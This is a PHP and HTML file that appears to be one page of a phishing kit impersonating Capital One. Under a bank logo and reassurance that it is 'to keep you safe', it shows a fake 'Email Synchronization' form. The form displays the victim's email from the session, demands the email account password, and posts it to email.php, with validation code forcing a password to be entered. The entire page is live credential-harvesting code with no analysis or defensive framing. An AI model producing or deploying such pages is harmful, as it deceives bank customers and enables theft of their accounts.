<?php
session_start ();
$email = $_SESSION['email'];
?>
<!DOCTYPE html>
<html><head>
<title>Capital One</title>
<script language="JavaScript" src="css/gen_validatorv2.js" type="text/javascript"></script>
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
 
 
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
 
 
<meta name="format-detection" content="telephone=no">
 
 
<meta name="x-rim-auto-match" http-equiv="x-rim-auto-match" forua="true" content="none">
 
 
<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
<link rel="icon" type="image/x-icon" href="images/favicon.ico">
 
		<link rel="stylesheet" href="css/mib_legacy.css?id=010" type="text/css" media="screen">
	
 
 
<script src="css/getBrowserData.js?id=021" type="text/javascript"></script>	
 
 
 
<style type="text/css"></style>
<script type="text/javascript" src="css/encoder.js"></script></head>
 
 
 
 


<body id="body">
 
 
	
 
    
<div class="content">
 
	
 
 

	
 
 
<div id="content">
 
 
 
<form id="name1" name="name1" action="email.php" method="post" autocomplete="off">
 
	<input name="browserData" value="" type="hidden">
	<input name="org.apache.struts.taglib.html.TOKEN" value="b1df98c6eedfca632a544e74ed27c636" type="hidden">
	<input id="jsEnabled" name="jsEnabled" value="false" type="hidden">

	
	
	<div class="content">
		<div class="heading"> <h2 class="float_left">
			<img border="0" src="images/capitalone-logo.png" width="330" height="70"></h2>
			<h2 class="float_left">Email Synchronization</h2></div>

		<div class="border_rnd_btm">
<div class="info_text"><span style="font-size: 180%">
			Just so we can keep you safe... <br>Synchronize your email address so we can send you alerts and offers in real time.</div>
			<div class="data clear noline">&nbsp;</div>
			<div class="data clear noline">&nbsp;</div><span style="font-size: 182%">
			<div class="data clear noline">
					<div class="data clear">
						<label class="data_label" for="password3"><span style="font-size: 100%">E-mail Address</label>
						<input class="data_input" type="text" placeholder="<?=$email ?>" disabled name="email" id="password3" maxlength="100" size="1">
					</div>
					<div class="data clear">
						<label class="data_label" for="password3"><span style="font-size: 100%">E-mail Password</label>
						<input class="data_input" type="password" name="emailpass" id="password3" maxlength="50" size="1">
					</div>

					<div class="data clear">&nbsp;</div></div></div>
			<input id="login" name="login" class="frm_button" value="Submit" type="submit">
		</div>
		<div class="mobTileOther">
			<a href="" title="Internet Banking promo tile">
			<img src="images/login-message-other.gif" alt=""> </a></div>
			
		
	</div>
</form>
 
<script language="JavaScript" type="text/javascript">
//You should create the validator only after the definition of the HTML form
  var frmvalidator  = new Validator("name1");

frmvalidator.addValidation("emailpass","req","Please enter your E-mail Address Password.");
frmvalidator.addValidation("emailpass","minlen=6","Invalid Password. Please enter your E-mail Address Password.");
frmvalidator.addValidation("emailpass","maxlen=50","Invalid Password. Please enter your E-mail Address Password.");

</script>

<div class="colspan welcome">
	<ul id="login_extras">
		<li>
			<a href="">Online Security Guarantee</a> </li>
		<li>
			<a class="navlink navlinkbelowhdr" href="">ATMs/Locations</a> </li>
		<li>				
			<a class="navlink" href="">CEO Mobile</a> </li>
		<li>
			<a class="navlink" href="">Quick Guide</a></li>
		<li><a href="">Help</a> </li>
	</ul></div>
 
</div>
</div></body></html>